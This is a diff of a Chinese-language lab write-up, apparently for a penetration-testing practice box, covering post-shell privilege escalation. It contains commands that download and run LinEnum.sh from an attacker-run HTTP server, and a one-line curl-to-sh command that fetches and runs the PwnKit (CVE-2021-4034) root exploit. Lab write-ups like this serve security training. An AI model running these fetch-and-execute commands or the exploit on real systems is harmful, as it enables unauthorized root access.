@@ -106,39 +106,57 @@ curl -v -F myFile=@image.jpg http://192.168.160.183/exiftest.php
 
 成功获得反弹shell，并查找到local.txt文件：
 
-<figure><img src="../.gitbook/assets/15.png" alt=""><figcaption></figcaption></figure>
-
 <figure><img src="../.gitbook/assets/14 (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 提升权限
 
 ### 本地信息收集
 
+<figure><img src="../.gitbook/assets/15.png" alt=""><figcaption></figcaption></figure>
 
+当手动枚举无明确收获时，可使用工具进行枚举，如：
 
+* LinEnum.sh
+* LinPEAS.sh
 
+本例使用LinEnum.sh，在Kali本机开启一个简易的服务器，将脚本传到目标上，直接运行该脚本：
+
+```bash
+// Kali本机：
+python3 -m http.server
+// 目标主机：
+curl http://192.168.45.220:8000/LinEnum.sh -o linenum.sh
+chmod +x linenum.sh
+./linenum.sh
+```
+
+<figure><img src="../.gitbook/assets/16.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞查找
 
+本例中，我是直接尝试搜索目标系统内核版本的相关漏洞，发现有可能可以尝试利用的脚本，所以直接root了。个人感觉LinPEAS.sh相较于LinEnum.sh来说更详细和高效，推荐用LinPEAS.sh来进行本地信息枚举。
 
-
-
+<figure><img src="../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
-
-
-
-
-### ROOT
-
-
-
-
+找到本例中的目标系统易受内核漏洞CVE-2021-4034的工具，同时找到其GitHub上的可利用脚本<mark style="color:red;">**PwnKit.sh**</mark>&#x20;
 
 {% hint style="info" %}
 MEMO.
 
 * [https://github.com/ly4k/PwnKit/tree/main](https://github.com/ly4k/PwnKit/tree/main)
-*
+* [https://ine.com/blog/exploiting-pwnkit-cve-20214034?source=post\_page-----0b50df883a65--------------------------------](https://ine.com/blog/exploiting-pwnkit-cve-20214034?source=post\_page-----0b50df883a65--------------------------------)
 {% endhint %}
+
+### ROOT
+
+开箱即用，一键root：
+
+```bash
+sh -c "$(curl -fsSL http://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+```
+
+<figure><img src="../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
